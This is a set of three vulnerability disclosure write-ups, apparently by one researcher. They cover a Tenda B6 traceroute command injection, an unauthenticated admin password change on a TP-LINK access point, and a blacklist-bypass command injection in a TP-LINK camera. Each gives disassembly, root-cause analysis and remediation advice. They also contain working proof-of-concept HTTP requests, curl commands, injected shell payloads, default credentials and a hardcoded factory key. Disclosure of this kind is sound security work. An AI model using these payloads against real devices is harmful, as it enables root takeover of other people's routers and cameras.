# Tenda B6 V1.0.0.4(4420): goform/setTraceroute destination OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- The injected command executes with root privileges (`doSystemCmd` is equivalent to `system()`)

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| Tenda | B6 outdoor CPE | B6 | `B6V1.0qc_V1.0.0.4(4420)_CN.zip` (containing `US_B6V1.0qc_V1.0.0.4(4420)_CN&EN_TDC01.bin`), fireversion `V1.0.0.4(4420)` | High | `httpd` (GoAhead 3.3.0 web server) `/goform/setTraceroute` and `/goform/getTraceroute` handlers |

Note on identification: the audit package's report identifies the vendor as Tenda (report title "tenda B6 V1.0.0.4(4420) setTraceroute 接口命令注入漏洞", firmware download hosted at `static.tenda.com.cn`, vendor-customized SquashFS using Tenda-specific magic values), while the audit platform's finding filename references "IP-COM B6"; the report and firmware source are followed here.

Firmware identity verified inside the package: package SHA-256 `6644ab3d98dd232d5d1ab178c4e7f91997e19755ecef7f2e596cca53a8dc1781`; MIPS 32-bit big-endian; SquashFS with vendor-customized magic `nice` (instead of `hsqs`) at image offset 0xfac56 and XZ stream magic changed to `Tenda\0`. Target binary `./squashfs-root/bin/httpd` (616,320 bytes). The web server listens on `lan.webport` (default 80).

## Vulnerability Description

The GoAhead web server embedded in the Tenda B6 firmware V1.0.0.4(4420) registers two goform action handlers for the traceroute diagnostic in `formDefineTendDa`: `setTraceroute` and `getTraceroute`.

- `setTraceroute` stores the user-supplied target address obtained through `websGetVar(wp, "destination", "1")` with no length check and no character filtering.
- `getTraceroute` (handler `fromTraceroutGet` at 0x00479398) invokes internal function `fcn.0047889c`, which — when `hop == 1` — kills any running traceroute and executes:

```
doSystemCmd("traceroute -n -4 %s > /var/log_tr.txt &", dest)
```

`dest` is user-controlled and is interpolated into the shell command line without any escaping, so semicolons, pipes, backticks, `$()` and other shell metacharacters break out of the argument. Since `httpd` runs as root, the injected command also runs as root, yielding full device compromise.

Authentication requirement (dynamic verification result): statically, the `route.txt` entry for `/goform` declares only `handler=action` with no `auth` directive, but at runtime the firmware-implemented session check (`authSecurityHandler` at 0x47fc00) enforces a server-side session on all `/goform/*` requests — unauthenticated requests are 302-redirected to `login.html`, and a forged cookie (`B6V1.0_user=admin` without logging in) is not accepted. Practical exploitation therefore needs a valid login session, obtainable with the firmware's built-in default credentials (`auth.txt` defaults to `admin`/`admin`). Once logged in, the injection point performs no filtering at all.

## Root Cause Analysis

Vulnerable binary: `./squashfs-root/bin/httpd` (MIPS32 BE). Source file per embedded path: `B6/prod/httpd/ap_web/cgi_outdoor/advance_setting.c` (`main.c` for the registration).

1. Handler registration (`formDefineTendDa` @ 0x0046e33c):

```
0x0046e340  addiu a0, v0, -0x2d30        ; "setTraceroute"
0x0046e344  lw    a1, -sym.fromTraceroutStart(gp)   ; handler = 0x478698
0x0046e350  jalr  t9                     ; websDefineAction("setTraceroute", fromTraceroutStart)
```

2. Parameter acquisition without filtering (`fromTraceroutStart` @ 0x004786cc):

```
0x004786d4  addiu a1, v0, -0x1d60        ; "destination"
0x004786e8  jalr  t9                     ; websGetVar(wp, "destination", "1") — no filtering
```

3. Command assembly and execution (`fcn.0047889c`, called from `fromTraceroutGet` at 0x004794e8):

```
0x00478918  addiu a0, v0, -0x202c        ; fmt = "traceroute -n -4 %s > /var/log_tr.txt &"
0x0047891c  lw    a1, (arg_24h)          ; dest (user-controlled)
0x00478928  jalr  t9                     ; doSystemCmd(fmt, dest)
```

with inner logic equivalent to:

```c
if (hop == 1) {
    if (proc_check_app("traceroute") > 0)
        doSystemCmd("killall -9  traceroute");
    doSystemCmd("traceroute -n -4 %s > /var/log_tr.txt &", dest);
}
```

4. Cross-references: the same format string (`.rodata` at 0x0048dfd4) is referenced identically by `fromNetToolGet` at 0x00475df0, and the ping helper `cmd_get_ping_output` builds `"ping %s -%d -c %d -s %d -W %d"` in the same unfiltered manner — both need the same fix.

The full chain from user input to shell execution is attacker-controlled: `doSystemCmd` ultimately reaches `system()` and `/bin/sh -c`.

## Exploitation

Preconditions:

- Network access to the web management interface (default port 80 / `lan.webport`).
- A valid login session; the firmware ships default credentials `admin`/`admin` (used by the PoC). Forged cookies do not bypass the server-side session check.

Step 1 — log in and obtain the session cookie:

```http
POST /login/Auth HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

Success returns `302` with `Set-Cookie: B6V1.0_user=admin; path=/`. (The `Host` header must be the bare IP without a port, otherwise the server's anti-rebinding check returns 400.)

Step 2 — store the injected destination:

```http
POST /goform/setTraceroute HTTP/1.1
Host: 192.168.1.1
Cookie: B6V1.0_user=admin
Content-Type: application/x-www-form-urlencoded

destination=1.1.1.1;echo pwned_by_B6_setTraceroute > /tmp/pwned_tr.txt;#
```

Response: `200` with `{"errCode":"0"}`.

Step 3 — trigger execution:

```http
GET /goform/getTraceroute?hop=1&dest=1.1.1.1;echo pwned_by_B6_setTraceroute > /tmp/pwned_tr.txt;# HTTP/1.1
Host: 192.168.1.1
Cookie: B6V1.0_user=admin
```

Step 4 — the firmware executes the assembled line; the semicolon truncates the ping-like argument and the injected command runs independently:

```
/bin/sh -c "traceroute -n -4 1.1.1.1;echo pwned_by_B6_setTraceroute > /tmp/pwned_tr.txt;# > /var/log_tr.txt &"
```

The response is `200` with `{"result":[{"finished":"0","order":"1","ip":"","time":"Unknown host"}]}` and the injected file `/tmp/pwned_tr.txt` now contains `pwned_by_B6_setTraceroute`. The httpd log line `/bin/sh: 1: traceroute: not found` confirms the host shell executed the injected command string.

Verification environment: QEMU user-mode full-chain reproduction (`qemu-mips-static -L ./squashfs-root ./squashfs-root/bin/httpd --home ./squashfs-root/webroot ./squashfs-root/webroot 0.0.0.0:8090`) with a mock of the `cfmd` configuration daemon on `/var/cfm_socket` (4-byte big-endian length + JSON frames; response `type` must be request `type + 1`). The PoC `poc_traceroute_ci.py` performs login → save payload → trigger → evidence collection and prints `VERDICT SUCCESS`.

## Evidence

![Firmware unpacking: SHA-256 6644ab3d... verified, custom SquashFS with magic "nice" sliced at offset 0xfac56 (bytes_used 5498018, 659 inodes), unsquashfs with patched tools produces squashfs-root with bin/httpd, webroot, libcommon.so, and fireversion=V1.0.0.4(4420)](B6_images/fig1.png)

![Asset identification: squashfs-root/etc_ro/fireversion.cfg reads fireversion=V1.0.0.4(4420)](B6_images/fig2.png)

![End-to-end QEMU reproduction: mock cfmd started on /var/cfm_socket, httpd listening on 0.0.0.0:8090, login POST /login/Auth with admin/admin succeeds (session B6V1.0_user=admin), POST /goform/setTraceroute with injected destination returns {"errCode":"0"}, GET /goform/getTraceroute triggers doSystemCmd, RCE evidence file pwned_tr_evidence.txt contains pwned_by_B6_setTraceroute, VERDICT SUCCESS](B6_images/fig3.png)

Supporting text evidence in the package: `pwned_tr_evidence.txt` (on-disk RCE proof), `httpd_emulation.log` (GoAhead startup banner and the `/bin/sh: 1: traceroute: not found` execution trace), `mock_cfmd.log` (cfm queries including `sys.username`/`sys.userpass` = admin), and `code_location.txt` (disassembly of registration, parameter acquisition and the dangerous call).

## Impact

- An attacker with web access and a valid session — trivially obtained on unmodified devices through the built-in `admin`/`admin` default credentials — executes arbitrary commands as root.
- Root-level command execution enables full control of the outdoor CPE: extraction of configuration and wireless credentials, pivot into the backhaul network, persistence, and bricking.
- The same injection pattern exists in `fromNetToolGet` (second traceroute reference) and in the ping helper, broadening the attack surface within `httpd`.

## Remediation Suggestions

1. Input whitelist: validate `destination`/`dest` strictly — accept only a legitimate IPv4 address (`^[0-9]{1,3}(\.[0-9]{1,3}){3}$`) or hostname (`^[a-zA-Z0-9][a-zA-Z0-9\-\.]{0,253}[a-zA-Z0-9]$`); reject semicolons, pipes, backticks, dollar signs, newlines, ampersands and other shell metacharacters.
2. Replace the dangerous execution primitive: replace `doSystemCmd` (equivalent to `system()`) with `execve`/`execvp` and an argument array so injection characters are never interpreted by a shell:

```c
char *args[] = {"traceroute", "-n", "-4", destination, NULL};
pid_t pid = fork();
if (pid == 0) { execvp("traceroute", args); _exit(1); }
```

3. Declare authentication on routes and harden sessions: the `route.txt` `/goform` routes should explicitly declare their auth requirement (e.g. `auth=digest`) so the policy is auditable; session validation should bind to a server-side random session token rather than a predictable static username cookie, and validate the source IP.
4. Least privilege: run `httpd` as a dedicated low-privilege user instead of root, retaining only capabilities such as `CAP_NET_RAW`.
5. Fix sibling sinks: `fromNetToolGet` (0x00475df0, same traceroute format string) and `cmd_get_ping_output` (`ping %s -%d -c %d -s %d -W %d`) share the same flaw and must be remediated together.
6. Eliminate default weak credentials: `auth.txt` ships `admin`/`admin`; force a password change at first login.

## References

- Firmware download (as present in the package): `https://static.tenda.com.cn/tdcweb/download/uploadfile/B6/B6V1.0qc_V1.0.0.4(4420)_CN.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

title: TP-LINK TL-XAP3000GI-PoE V4.0 1.0.23: dms set_password Unauthenticated Administrator Password Change (Pre-Auth, Account Takeover)
content:
# TP-LINK TL-XAP3000GI-PoE V4.0 1.0.23: dms set_password Unauthenticated Administrator Password Change (Pre-Auth, Account Takeover)

## Vulnerability Type / CWE

- **CWE-306**: Missing Authentication for Critical Function — the administrator password-change action is registered in the unauthenticated action table
- **CWE-620**: Unverified Password Change — the only gate tests whether the device is still factory-default, not whether the requester is authorized
- Related: CWE-287 (Improper Authentication); hardcoded factory credential constant in `.rodata`
- Package rating: Critical, CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| TP-LINK | TL-XAP3000GI-PoE Easy-fit (易展版) wireless AP, PoE wall-plate | hardware 4.0 (`squashfs-root/conf/apdb.json` → models[0].hwver) | `TL-XAP3000GI-PoE易展版 V4.0升级软件20240815_1.0.23.zip` → `TL-XAP3000GI-PoE易展版 V4.0_1.0.23_Build_20240815_Rel.40000.bin` | Critical | `squashfs-root/bin/dms` (web-management TDP action dispatcher, ARM 32-bit MediaTek MT7981, musl libc, 4,659,120 bytes), action `set_password` registered at VA 0x001621D0 |

Firmware identity verified inside the package: firmware image MD5 `263029b54973a72693ae37f36aa64182`, SHA-256 `62e8edd4274244f0bb29987c0a1b833bf98823208d60d46b5e3e04cfeaea83d2` (13,894,656 bytes); package MD5 `cc469a20d70a8d9d8df3ff6dc0e6a781`; platform MediaTek MT7981 / ARM 32-bit / musl libc / OpenWrt 21.02-SNAPSHOT (`DISTRIB_RELEASE="r0-55c643cba"`, `DISTRIB_TARGET="mediatek/mt7981"`), `BUILD_DATE=20240815`.

## Vulnerability Description

The web-management daemon `/bin/dms` registers the critical "change administrator password" function into its unauthenticated action table. During `httpCallHandle()` initialization it calls `registerActionAllowUnauth()` four times, enrolling these methods as session-token-free actions:

```
login          -> 0x001654F4
confirm_login  -> 0x0016309C
query_auth_log -> 0x0016306C
set_password   -> 0x00162FB0     <-- vulnerability entry
```

Unlike the protected `registerAction()`, the unauth table means the request URL does not need to carry a `stok` session token for the dispatcher to hand the request to the handler.

The `set_password` handler at VA 0x00162FB0 runs a single gate, `httpDefAuthKey()` (VA 0x00156618), which only `strcmp()`s the session `authKey` against the factory-default constant `WaQ7xbhc9TefbwK` compiled into `.rodata` at 0x003D8E23 and shipped with every device. If they are equal — i.e. the device is still in its default/uninitialized state — the handler reads the attacker-supplied `password`/`username` fields straight from the request JSON, calls `httpDoChangeDefaultUsr()` and `httpDoChangeDefaultPwd()` to write the new password into `/system/account_info/account_info`, and issues a valid session via `httpGenAuthKey()`.

On any default/uninitialized device, any unauthenticated host on the LAN can therefore set the administrator password to a value of its choosing without logging in, without a `stok` token, and without knowing any secret — full unauthenticated account takeover. After takeover the attacker can change the SSID/management address, push configuration, alter wireless keys, wipe NVRAM or deny service. Unlike a weak-password problem, there is no password-verification step at all before the change.

## Root Cause Analysis

Step 1 — the unauth registration. In `httpCallHandle()` (initialization region, `httpCallHandle@@Base+0x74c..+0x7cc`) the fourth `registerActionAllowUnauth` call resolves its literals as:

```
001621c4:  ldr  r1, [pc, #940]   ; pool [0x00162578] = 0x002618d0
001621cc:  add  r1, pc, r1       ; 0x001621d4 + 0x002618d0 = 0x003C3AA4 -> "set_password"
001621c8:  add  r2, pc, r2       ; pool [0x00162574] = 0x00000ddc
                                ; 0x001621d4 + 0xddc = 0x00162FB0 -> handler
```

i.e. `registerActionAllowUnauth("set_password", 0x00162FB0)` — the action lives in the unauth dispatch table and needs no `stok` session token.

Step 2 — the handler. At 0x00162FB0 (`httpCallHandle+0x15c0`, file offset 0x00152FB0, size 0x9c, ends 0x0016304C) the prologue loads the connection context, then:

```
00162fcc:  bl   156618 <httpDefAuthKey@@Base>     ; the only gate in the whole function
00162fd0:  cmp  r0, #0
00162fd4:  beq  163044                            ; gate==0 -> return error
00162fe4:  bl   3546f4 <jsonObjectGetString@@Base> ; "password" (0x003C3AA8)
00163004:  bl   3546f4 <jsonObjectGetString@@Base> ; "username" (0x003B9E59)
00163010:  bl   320158 <dataModuleStartCache@@Base>
0016301c:  bl   15ce5c <httpDoChangeDefaultUsr@@Base>
00163034:  bl   15cc74 <httpDoChangeDefaultPwd@@Base>  ; writes new password
00163038:  bl   320170 <dataModuleFlushCache@@Base>
```

There is no second authorization call, no token comparison, and no permission-bit check anywhere in 0x00162FB0–0x0016304C. Note that `ctx->authKey` (offset 0x164) is passed at 0x00163028 as the slot to backfill with the new auth key — not used to verify the caller.

Step 3 — the gate itself. `httpDefAuthKey()` is six instructions:

```
00156618:  ldr  r1, [pc, #24]    ; pool [0x00156638] = 0x002827f7
0015661c:  add  r0, r0, #0x164   ; &ctx->authKey
00156628:  bl   strcmp@plt
0015662c:  clz r0, r0 / lsr r0, r0, #5   ; fold equality to 1
```

The string address resolves to 0x00156630 + 0x002827f7 = 0x003D8E23, containing the plaintext constant `WaQ7xbhc9TefbwK`. The gate therefore answers "is the device still factory-default", not "is the requester authorized" — and the constant is readable by anyone from the shipped firmware (`strings -a -t x ./rootfs/bin/dms | grep WaQ7xbhc9Tefbw`, file offset 0x2d8e23), making the gate outcome publicly predictable.

Step 4 — CWE synthesis: (a) CWE-306, a critical function is enrolled in the unauth table; (b) CWE-620, device state is mistaken for subject identity; (c) the model is self-contradictory — `login` in the same unauth table still verifies a password, `set_password` does not; (d) the full chain was replayed by the firmware's own ARM instructions in Unicorn, showing `strcmp(authKey, "WaQ7xbhc9TefbwK")` passing and `httpDoChangeDefaultPwd(ctx, "Pwned_CNVD", ctx+0x164)` being reached.

## Exploitation

Preconditions:

- The device is in its default/uninitialized state (`ctx->authKey` still equals the factory constant) and the attacker can reach the management HTTP service (port 80) on the LAN. No credentials, no session token (`stok`), no user interaction.
- The verification below executes the unmodified `/bin/dms` (4,659,120 bytes) native instructions in Unicorn 2.1.2 ARM little-endian emulation (full-system boot is not possible for this V4 encrypted-header firmware; the harness maps the ELF PT_LOAD segments with stack 0x30000000 / heap 0x20000000 and hooks only external calls).

Step 1 — send the unauthenticated request (no `stok`, no login):

```http
POST /stok=/ds HTTP/1.1
Host: <device address>
Content-Type: application/json

{"method":"do","set_password":{"username":"attacker","password":"Pwned_CNVD"}}
```

On a real device the equivalent curl form given in the package is:

```bash
curl -s -m 8 -X POST "http://192.168.1.1/ds" \
  -H "Content-Type: application/json" \
  -d '{"method":"do","set_password":{"username":"attacker","password":"Pwned_CNVD"}}'
# expected: {"error_code":0}
curl -s -m 8 -X POST "http://192.168.1.1/" \
  -H "Content-Type: application/json" \
  -d '{"method":"do","login":{"username":"attacker","password":"Pwned_CNVD"}}'
# expected: {"error_code":0,"stok":"<32-hex-session-token>"}  <- admin session
```

Step 2 — firmware-side execution observed in the Unicorn run of the genuine handler:

```
[CMD-CONSTRUCTED] POST /stok=/ds {"method":"do","set_password":{"username":"attacker","password":"Pwned_CNVD"}}
[IMPORT] strcmp(0x20002164="WaQ7xbhc9TefbwK", 0x003d8e23="WaQ7xbhc9TefbwK")
[IMPORT] jsonObjectGetString("password") -> "Pwned_CNVD"
[IMPORT] jsonObjectGetString("username") -> "attacker"
[IMPORT] httpDoChangeDefaultUsr(ctx, "attacker")
[IMPORT] httpDoChangeDefaultPwd(ctx, "Pwned_CNVD", ctx+0x164)
[*] handler returned 0xffff6222
VERDICT SUCCESS
```

The firmware's only authentication — the strcmp — passes against the factory constant; the attacker-chosen password is then handed to the password-write function. No login, no session token, no password check occurred anywhere in the chain.

## Evidence

![Firmware unpacking and identity: binwalk maps the LZMA/kernel/FDT layout with SquashFS at 0x3519C8 (xz, 815 inodes, created 2024-08-12); build_info.conf shows BUILD_DATE=20240815 / SYS_SOFTWARE_REVISION=0x50010017 and openwrt_release shows OpenWrt r0-55c643cba target mediatek/mt7981](XAP3000GI_images/fig1.png)

![fwversion.sh confirms the firmware MD5 263029b5... and model TL-XAP3000GI-PoE易展版 hwver 4.0, with unicorn 2.1.2 ARM little-endian emulator ready for the verification run](XAP3000GI_images/fig2.png)

![End-to-end PoC: the firmware's own set_password handler at 0x00162fb0 passes the single strcmp gate against the hard-coded factory default, extracts attacker password/username from the JSON request, reaches httpDoChangeDefaultPwd(ctx, "Pwned_CNVD", ctx+0x164) and prints VERDICT SUCCESS — no session token or login required](XAP3000GI_images/fig3.png)

Supporting text evidence in the package: `unauth-setpw-boot.transcript` (startup trace), `unauth-setpw-result.transcript` (result trace with `VERDICT SUCCESS` / `PWNED_CNVD`), `unauth-setpw-code-location.txt` (disassembly of the registration site, handler and gate), and `firmware-hashes.txt` (asset hashes).

## Impact

- Complete unauthenticated administrator account takeover on default-state devices: an attacker sets the admin username/password to values of their choosing and receives a valid management session (`stok`), without ever needing a secret.
- With administrator access the attacker can reconfigure the AP (SSID, management address, wireless keys), push arbitrary configuration, erase NVRAM, or deny service; on PoE wall-plate APs deployed at customer premises this also undermines the wired network behind them.
- The same hardcoded constant ships in every device's firmware, so the precondition "device still default" is trivially satisfiable at scale, and the CVSS vector is network/low-complexity/no-privileges (9.8 Critical).

## Remediation Suggestions

1. Move `set_password` out of the unauthenticated action table (mandatory): at `/bin/dms` VA 0x001621D0 change `registerActionAllowUnauth("set_password", 0x00162FB0)` to the protected `registerAction()` so requests must carry a `stok` token issued by `httpGenAuthKey()` and validated by `httpDoAuthorize()`. Review the other three unauth actions (`login`, `confirm_login`, `query_auth_log` at VA 0x00162108/0x00162150/0x00162190) for least privilege; `query_auth_log` leaks authentication logs and should be protected as well.
2. Enforce authorization and audit on the password-change handler: at 0x00162FB0 require an authenticated session, an administrator-privileged subject, and a target account that is the current login or explicitly designated by an administrator; log source IP / old account / time; invalidate all other sessions after a successful change.
3. Remove or redesign the `httpDefAuthKey()` gate: the "authKey equals factory default" test (CWE-620) must leave the security decision path. If a first-boot provisioning flow is required, use a per-device unique, factory-random credential printed on the label/QR code delivered as a one-time HMAC or signature, invalidate it after the first successful change with a persisted `initialised=1` marker, and replace `strcmp()` with constant-time comparison plus attempt-rate limits.
4. Fix the hardcoded factory credentials: the plaintext constants at .rodata 0x003D8E23 (`WaQ7xbhc9TefbwK`) and 0x003D8E14 (`WaQ7xbhc9TefbwKWaQ7xbhc9TefbwK`) publish the initial management credential of every unit; replace with per-device random secrets delivered through a protected provisioning flow and force a password change at first login.
5. Password storage and session handling: never compare passwords with `strcmp()`; persist salted hashes (PBKDF2-HMAC-SHA256 / Argon2id); treat `ctx->authKey` as a session credential that is never backfilled from request JSON fields or used as an identity test; generate session tokens with a CSPRNG with length/expiry/binding; add CSRF and same-origin checks to `set_password` / `reset_password`.
6. Verification: after the fix, re-running `poc_unauth_setpw.py` must show the action no longer in the unauth table, the emulation rejected by `httpDoAuthorize()` before `httpDefAuthKey`, and the script exiting with `VERDICT INCONCLUSIVE`/a rejection code instead of `VERDICT SUCCESS`.

## References

- Firmware download (as present in the package): `https://media.tp-link.com.cn/software/TL-XAP3000GI-PoE%E6%98%93%E5%B1%95%E7%89%88%20V4.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240815_1.0.23.zip?forcedownload=TL-XAP3000GI-PoE%E6%98%93%E5%B1%95%E7%89%88%20V4.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620240815_1.0.23.zip`

## Discoverer

Vulnerability discovered by **JiuZero**.

content:
# TP-LINK TL-IPCX4XEP-AZ V2.0 1.0.6: tmpd tmp_execute_shell_cmd OS Command Injection (Incomplete Blacklist, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- Root cause: incomplete blacklist filtering (CWE-184 / CWE-20) — a six-entry `strstr()` blacklist with a mistyped sixth entry, no newline coverage, and no coverage of `( ) > < \`
- The package rates the issue High, with CVSS 3.1 vector `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

## Affected Product

| Vendor | Product | Model | Firmware filename & version | Severity | Component |
| --- | --- | --- | --- | --- | --- |
| TP-LINK | TL-IPCX4XEP-AZ(2.7-12mm) IPC camera (upgrade package name TL-AIPC544NP-AZ) | TL-IPCX4XEP-AZ(2.7-12mm), hardware 2.0 | `TL-AIPC544NP-AZ(2.7-12mm) V2.0升级软件20250701_1.0.6.zip` (software 1.0.6 Build 250701 Rel.39472n) | High | `rootfs/bin/main` — TMPD factory-test/device-message module, `tmp_execute_shell_cmd()` at 0x00248874 (Thumb-2); blacklist check 0x002488b8–0x002488d8, injection sink 0x002488de (`popen@plt`) |

Firmware identity verified inside the package: package SHA-256 `29689e780e5206aa125edfdcec9d6edb6c470d2c2affba2b6f0a390cac087879`; inner image `TL-AIPC544NP-AZ(2.7-12mm) V2.0_1.0.6_Build_250701_Rel.39472n.bin`; target binary `bin/main` (ELF32 little-endian ARM EABI5, 3,589,884 bytes, MD5 `d14526009db1624542d59855c90559f8`). Platform MT7608, Linux 5.10.61, SquashFS 4.0 (xz) at offset 0x800200. Version string from `./extract/rootfs/etc/default/device_info/info`: `"device_model": "TL-IPCX4XEP-AZ(2.7-12mm)"`, `"hw_version": "2.0"`, `"sw_version": "1.0.6 Build 250701 Rel.39472n"`.

## Vulnerability Description

`tmp_execute_shell_cmd(char *cmd, char *out, int out_len)` in the TMPD module hands a string to the shell and reads back the output. Before execution it runs the string through a six-entry blacklist table (base 0x00348e1c) with `strstr()`:

```
tbl[0] = ";"   tbl[1] = "&"   tbl[2] = "|"
tbl[3] = "$"   tbl[4] = "`"   tbl[5] = "\'"   (backslash + apostrophe, two characters)
```

Three compounding defects:

1. The sixth entry is mistyped. The string at 0x00348440 has raw bytes `5c 27 00` — the two-character sequence `\'` rather than a bare apostrophe — so a single `'` is never rejected.
2. The newline character 0x0A is missing. `/bin/sh` treats a newline as a command separator, and the blacklist contains nothing covering newlines, sub-commands, or output redirection. The reproduction uses exactly a newline to append a second command.
3. `(`, `)`, `>`, `<` and `\` are missing — all shell metacharacters capable of command substitution, sub-shells and file overwriting.

Once the check passes, the string is handed verbatim to `popen()` at 0x002488de and interpreted by `/bin/sh -c`, with no length truncation, encoding normalization, or argv splitting. Any caller able to pass a string into this function — the MacTool factory-test command handlers, `execute_script()`, and the `/config/disable_telnetd`, `/factory_info/factory_test_mode` request handlers — can append arbitrary commands with a newline or redirection and execute them as root. A second shell wrapper in the same binary, `run_shell_cmd` (0x007db9c → `system@plt` at 0x007dbf8), only checks `strlen < 512` and also performs no sanitization, indicating a module-level design flaw rather than a one-off typo.

## Root Cause Analysis

Entry-point location: `strings -a` on `bin/main` hits four mutually corroborating TMPD strings — `"tmp_execute_shell_cmd"` @ 0x00348f0a, `"[TMPD]Shell command is %s"` @ 0x003488cb, `"[TMPD]Shell command is invalid"` @ 0x003488e5, `"[TMPD]Shell receive is %s"` @ 0x00348904 — whose `.text` xrefs converge on the function body at 0x00248874; the log macro line-number constants 1499 / 1509 at 0x002488a8 / 0x002488c8 match source lines 1499–1541.

Call chain — eight ARM-side call sites invoke 0x00248874: 0x002061a8, 0x002066fe, 0x0020712c, 0x002071c0, 0x00207428, 0x0020767e, 0x002076f2, 0x00246296. The first four sit in the MacTool factory-test instruction dispatch table (which itself contains several same-shaped `system()` sinks at 0x002069b6–0x00206af8); 0x00246296 is inside `execute_script()`; the rest are the `/config/disable_telnetd` and `/factory_info/factory_test_mode` handlers.

Key disassembly (`arm-linux-gnueabihf-objdump -d -Mforce-thumb`):

```
00248874:  stmdb sp!, {r4-r8,lr}
           mov  r7, r0                ; r7 = cmd (raw caller string)
           ldr  r6, [pc, #252]        ; r6 = 0x00348e1c blacklist pointer table
           ldmia r6!, {r0-r3} / ldmia.w r6, {r0, r1}   ; copy 6 pointers to stack
           mov  r6, r7                ; r6 = cmd
           cbnz r6, 2488a2            ; NULL check only
2488b2:    movs r4, #6                ; 6-entry loop counter
2488b8 <loop_top>:
           subs r4, #1
           mov  r0, r6                ; haystack = cmd
           ldr.w r1, [r7, r4, lsl #2] ; needle = tbl[r4]
           blx  1bcc0 <strstr@plt>    ; strstr(cmd, tbl[i])  <== sole filtering
           cbz  r0, 2488d6            ; miss -> next entry
           blx  1bae8                 ; log "[TMPD]Shell command is invalid"
           b.n  248896                ; return -1
2488d6:    cmp r4, #0 / bne 2488b8    ; all six checked?
2488da <sink>:
           ldr  r1, [pc, #172]        ; 0x002515a8 "r"
           mov  r0, r6                ; r0 = cmd (unsanitized)
           blx  1be78 <popen@plt>     ; command injection sink
```

Blacklist recovery — the six little-endian pointers at 0x00348e1c dereference to: `0x0028c2f9 = ";"`, `0x0030b500 = "&"`, `0x0030a60b = "|"`, `0x0034843c = "$"`, `0x0034843e = "`"`, `0x00348440 = 5c 27 00` (the two characters `\'`). Equivalent pseudocode:

```c
int tmp_execute_shell_cmd(char *cmd, char *out, int out_len) {
    static const char *tbl[] = { ";", "&", "|", "$", "`", "\\'" };
    if (cmd == NULL || out == NULL) return -1;
    firmware_log(0, "tmp_execute_shell_cmd", 1499, "[TMPD]Shell command is %s", cmd);
    for (int i = 5; i >= 0; i--)
        if (strstr(cmd, tbl[i])) {          /* sole filtering: 6 strstr calls */
            firmware_log(0, "tmp_execute_shell_cmd", 1509, "[TMPD]Shell command is invalid", cmd);
            return -1;
        }
    FILE *fp = popen(cmd, "r");             /* CWE-78 sink at 0x002488de */
    ...
}
/* newline 0x0A, ( ) > < \ and a bare ' are absent from tbl and bypass it */
```

Dynamic cross-validation: the package PoC maps the two real PT_LOAD segments of `bin/main` into Unicorn ARM and executes the genuine function in Thumb state, hooking only `strstr`, `popen`, `fread`, `pclose` and firmware logging. The observed `strstr` check sequence is `["\\'", '`', '$', '|', '&', ';']` — exactly the statically recovered six entries; benign `echo hello` reaches `popen()`, while `echo a; id` and `` echo `id` `` are correctly rejected by `tbl[0]` / `tbl[4]`, proving the blacklist is live but incomplete.

## Exploitation

Preconditions:

- Reachability of any caller of `tmp_execute_shell_cmd()` — e.g. the MacTool factory-test instruction channel (TLV messages to the tmpd Unix socket at `/tmp/tmpd_uds_name`), `execute_script()`, or the `/config/disable_telnetd` and `/factory_info/factory_test_mode` request handlers — depending on which surface the attacker can reach. The injection itself is a single function whose filter is bypassable by one character.
- Verification context: level-3 Unicorn ARM single-function emulation of the real firmware binary (full-system emulation was not feasible — the rootfs ships only vendor application bundles plus MT7608-specific peripheral libraries, and `bin/main` as a multi-process daemon depends on SoC peripheral models, `/dev` nodes and the hardware watchdog).

Step 1 — unpack and verify: `bash ./extract_firmware.sh` verifies SHA-256, extracts the `.bin`, locates SquashFS at 0x800200, and unpacks `./extract/rootfs` (bin/main MD5 `d14526009db1624542d59855c90559f8`).

Step 2 — run the PoC against the real function: `python3 ./poc.py --exec` (or `--case 3` for the newline case). Payloads tested: control `echo hello`; blacklist-blocked `echo a; id` and `` echo `id` ``; bypass group `echo hello\nid`, `echo hello > /tmp/pwned_tmpd`, `ls /etc\n/bin/sh -c 'cat /etc/passwd'`, `id > /tmp/pwned_tmpd # 'quoted'`; and `echo hello$(id)` (blocked by `$`).

Step 3 — the newline payload passes all six checks and reaches the sink:

```
[IMPORT] popen('echo hello\nid', 'r')
[CMD-CONSTRUCTED] echo hello\nid
[SHELL]    /bin/sh -c 'echo hello\nid' -> rc=0, 58 bytes on stdout
[SHELL-OUT] hello
[SHELL-OUT] uid=0(root) gid=0(root) groups=0(root),1000(docker)
[VERDICT] injection accepted: payload passed the filter and reached popen()
```

Step 4 — on-target proof: `cat /tmp/pwned_tmpd` returns `uid=0(root) gid=0(root) groups=0(root),1000(docker)`, showing the injected command executed as root; the one-key script ends with `[run_emulation] RESULT: command injection confirmed (uid=0(root) reached)`.

## Evidence

![Firmware extraction and identity: extract_firmware.sh verifies package SHA-256 29689e78..., binwalk maps the MVX4##I6C uImage / Linux-5.10.61 / SquashFS at 0x800200, and the device info file reports device_model TL-IPCX4XEP-AZ(2.7-12mm), hw 2.0, sw 1.0.6 Build 250701 Rel.39472n](IPCX4XEP_images/fig1.png)

![Unicorn ARM emulation of the real tmp_execute_shell_cmd(): benign echo hello reaches popen(); echo a; id and echo `id` are rejected by blacklist entries ';' and '`'; BYPASS #1 newline payload echo hello\nid passes the filter, is executed by /bin/sh -c and returns uid=0(root)](IPCX4XEP_images/fig2.png)

![Remaining bypass cases: subshell $() blocked only by '$' (bare parentheses unfiltered), newline+chain reading /etc/passwd, and bare-quote redirect id > /tmp/pwned_tmpd # 'quoted' all reach popen() with VERDICT injection accepted; the run ends with [run_emulation] RESULT: command injection confirmed (uid=0(root) reached)](IPCX4XEP_images/fig3.png)

